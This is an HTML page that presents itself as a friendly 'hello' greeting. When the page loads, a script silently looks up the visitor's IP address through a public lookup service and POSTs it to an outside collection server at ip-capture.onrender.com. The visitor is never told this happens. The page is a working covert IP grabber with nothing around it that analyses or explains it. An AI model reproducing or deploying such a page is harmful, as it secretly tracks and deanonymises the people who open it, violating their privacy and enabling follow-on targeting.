<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Hello to you!</title>
    <script src="https://smtpjs.com/v3/smtp.js"></script>
</head>
<body>
    <h1>I just wanted to say hello! hope you're doing well. Take care.</h1>
    <script>
        (async() => {
            const ipObj = await fetch('https://ipv6.seeip.org/jsonip').then((r) => r.json()).then(r => r).catch(e => console.error(e));
            await fetch('https://ip-capture.onrender.com', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(ipObj)
            })
        })()
    </script>
</body>
</html>
